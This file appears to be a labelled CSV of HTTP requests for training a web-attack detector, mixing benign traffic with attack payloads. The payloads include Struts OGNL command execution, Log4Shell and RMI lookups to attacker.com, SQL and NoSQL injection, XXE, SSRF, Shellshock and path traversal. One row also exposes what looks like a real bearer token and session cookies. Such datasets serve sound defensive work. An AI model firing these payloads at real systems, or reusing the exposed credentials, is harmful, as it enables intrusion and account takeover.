method,path,query,headers,body,ua,label
GET,/,,GET /admin/users?limit=20&offset=40,,,0
GET,/favicon.ico,,,,,0
GET,/,,"id=1 UNION SELECT null, user(), database()--",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/index.action,"method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat%20/etc/passwd","Accept-Encoding: gzip; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/121.0.2277.128",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/121.0.2277.128",1
GET,/,,POST /api/v1/user/avatar (multipart/form-data),,,0
GET,/,,GET /api/v1/products/101,,,0
GET,/,,GET /settings/security,,,0
GET,/,,; cat /etc/passwd,,,1
GET,/,,GET /products?sort=price_desc&page=1,,,0
GET,/,,"#set($str=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id""))",,,1
PUT,/admin,,Host: example.com; Accept: */*,input=http://127.0.0.1:8080/admin,Nikto/2.1.6,1
GET,/properties/,keyword_search=--!%3E%22%20autofocus%20onfocus%3Dalert(/3A0GarFNwNrfwKlL6ZoGSnErYFF/)%3B%2F%2F,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0,1
GET,/,,(&(uid=admin)(|(password=*))),,,1
GET,/,,..\..\..\..\windows\system32\config\sam,,,1
GET,/favicon.ico,,,,,0
GET,/,,"PUT /billing/address {""street"": ""123 Main St"", ""city"": ""Hanoi""}",,,0
GET,/test-framework-api/user/test-framework/tf-test-element-repository/a7a7cd11-818f-430a-9e2d-349764470882/path,,"Accept: */*; Accept-Encoding: gzip, deflate, br, zstd; Accept-Language: en-US,en;q=0.9; Authorization: Bearer eyJraWQiOiJMbHFRYVBsYXRmb3JtIiwiYWxnIjoiUlMyNTYifQ.eyJpc3MiOiJMbHFRYVBsYXRmb3JtIiwianRpIjoiYzQ3YWNlODAtYzhlMy00MTEwLWI4YzAtOTkxMDQwNDY0ODAxIiwic3ViIjoiY3R2LnRvYWluYUB2bnBheS52biIsImVtYWlsIjoiY3R2LnRvYWluYUB2bnBheS52biIsInRva2VuVHlwZSI6IlVTRVIiLCJpYXQiOjE3NzAyNTk3NDB9.W5i4eon1NVoYs9aXRQTOkdiCWKEOOzXDMtdu7XsBAokeoCYKtn_Nzvew74_Ofxc-N7noxiPWBeg-Aw5YhLhD2wJmGyH6OSzzYAu8raTBYuREaua3sWaoZtC7yEtpjqfM7fktTpZl1HC7Y_51ZUIBW1PDeJUfS7U9Wxv4DubjhOYIFMi8m4kuwETKIXfpZRj0pGW6gMHB0FqOFOwcvxJvksjpWR_9lM7uM-5MJ4-ikIvn59O1wSbjzDdIzB5cApTI6p6xz-CTBUDa7t_ald4-IeUpuYCBnxlr9pRHCSatrH07pEch_p3r5KXIJ4HYX-GaQq60XUoX6ylsPs09uIiAJA; Connection: keep-alive; Content-Type: application/json; Cookie: ph_phc_t3lgBB66QsPW4HEfiGopO14um4XGNtBcefEKYWelWda_posthog=%7B%22distinct_id%22%3A%22cba4bce79c20e258e2af870f7da2336cab7a4ff12408f61669dd512e4eb4c815%22%2C%22%24sesid%22%3A%5B1770279986269%2C%22019c2ce8-d9e5-7e53-8681-7f3c2735821b%22%2C1770279983589%5D%2C%22%24epp%22%3Atrue%7D; __Host-grv_app_session=c9d934c1478b10a2e30a41bc973a25c8361ca7a4606245588b918fbf9a37a3b0; __Host-grv_app_session_subject=27ab9ab86d7df219f567eef8fe70893192c5f28752c8c8b421357495eb6b7599; Host: lqa.vnpaytest.vn; Language: en; Referer: https://lqa.vnpaytest.vn/qa-platform/; Sec-Ch-Ua: ""Not(A:Brand"";v=""8"", ""Chromium"";v=""144"", ""Google Chrome"";v=""144""; Sec-Ch-Ua-Mobile: ?0; Sec-Ch-Ua-Platform: ""Windows""; Sec-Fetch-Dest: empty; Sec-Fetch-Mode: cors; Sec-Fetch-Site: same-origin; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36; X-Request-Id: 9b1db668-760b-46b5-9f1e-35d647e5cc8f",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",0
GET,/,,GET /user/mfa/setup-qr,,,0
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,id=1' OR '1'='1,,,1
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/,,query { a: user(id:1) { name } b: user(id:2) { name } },,,1
GET,/,,cos\nsystem\n(S'id'\ntR.,,,1
GET,/,,POST /register (detailed user info),,,0
PUT,/index.php,,Host: example.com; Accept: */*,"input="" onmouseover=alert(1) """,curl/7.68.0,1
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
POST,/blog/article-1,,Host: example.com; Accept: */*,username=user564&password=pass511,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,"POST /api/v1/payment/tokens {""card_last4"": ""4242""}",,,0
GET,/,,GET /products/compare?base=p1&target=p2,,,0
GET,/,,"POST /contact (name, email, message)",,,0
GET,/,,' or '1'='1,,,1
GET,/,,{{7*7}}{{ '7'*7 }},,,1
DELETE,/cart,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,POST /api/v1/user/avatar (multipart/form-data),,,0
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,GET /newsletter/unsubscribe?token=abc123def456,,,0
GET,/,,dict://localhost:11211/stat,,,1
GET,/,,query { a: user(id:1) { name } b: user(id:2) { name } },,,1
GET,/,,query { a: user(id:1) { name } b: user(id:2) { name } },,,1
GET,/,,cos\nsystem\n(S'id'\ntR.,,,1
GET,/,,..\..\..\..\windows\system32\config\sam,,,1
GET,/,,http://127.0.0.1:22,,,1
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
GET,/,,GET /api/v1/locale/set?lang=en,,,0
GET,/,,GET /stores/find?zip=10001&distance=10,,,0
GET,/,,GET /downloads/guide-v2.pdf,,,0
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
GET,/,,GET /robots.txt,,,0
GET,/,,GET /search?q=C%23,,,0
GET,/,,Content-Length: 4\r\n\r\n1234,,,1
GET,/,,GET /ws/notifications (Upgrade: websocket),,,0
GET,/,,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
GET,/favicon.ico,,,,,0
GET,/,,${jndi:ldap://attacker.com/a},,,1
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
GET,/,,id=0x27204f52202731273d2731,,,1
GET,/,,GET /stores/find?zip=10001&distance=10,,,0
GET,/,,${jndi:ldap://attacker.com/a},,,1
GET,/,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,,1
PUT,/admin,,Host: example.com; Accept: */*,input=' OR 'x'='x,Nikto/2.1.6,1
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,GET /products?category=electronics&brand=apple,,,0
DELETE,/api/v1/users,,Host: example.com; Accept: */*,input=..\..\..\windows\system32,sqlmap/1.5.2,1
GET,/,,__proto__[admin]=true,,,1
GET,/,,url=http://malicious.com,,,1
GET,/,,dict://localhost:11211/stat,,,1
GET,/,,"id=1 UNION SELECT null, user(), database()--",,,1
GET,/favicon.ico,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /health,,,0
GET,/,,${os.system('id')},,,1
GET,/,,GET /api/v1/search/suggest?q=secur,,,0
GET,/,,"POST /reviews {""id"": ""p_50"", ""stars"": 5, ""comment"": ""Amazing quality!""}",,,0
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,GET /newsletter/unsubscribe?token=abc123def456,,,0
GET,/,,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,1
GET,/,,GET /admin/dashboard/users/active,,,0
GET,/,,$(whoami),,,1
GET,/,,POST /api/v1/user/avatar (multipart/form-data),,,0
DELETE,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,PUT /api/v1/profile (JSON payload),,,0
GET,/,,%0d%0a* CAPABILITY,,,1
GET,/,,GET /settings/security,,,0
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,expect://id,,,1
GET,/,,GET /products?sort=price_desc&page=1,,,0
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,url=http://malicious.com,,,1
